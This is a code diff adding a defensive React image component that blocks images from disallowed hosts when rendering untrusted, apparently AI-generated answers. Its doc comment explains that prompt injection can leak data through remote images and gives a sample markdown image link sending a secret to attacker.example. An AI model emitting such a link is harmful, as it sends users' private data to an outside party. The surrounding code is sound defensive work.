@@ -67,3 +67,17 @@ export const SAFE_COMPONENTS: Components = {
   picture: ({ children }) => <>{children}</>,
   source: () => null,
 };
+
+/**
+ * An image the app's `isImageAllowed` refused: its alt text in brackets, never requested. Loading remote images is how
+ * a prompt injection leaks data (`![](https://attacker.example/?q=<secret>)`), so apps that render untrusted answers can
+ * restrict hosts.
+ */
+export function imageWithPolicy(isImageAllowed: (url: string) => boolean): Components['img'] {
+  return function PolicyImage({ src, alt }) {
+    if (typeof src !== 'string' || !src || !isImageAllowed(src)) {
+      return <span className="rlm-img-blocked">{`[${alt || 'image'}]`}</span>;
+    }
+    return <img alt={alt ?? ''} className="rlm-img" loading="lazy" referrerPolicy="no-referrer" src={src} />;
+  };
+}
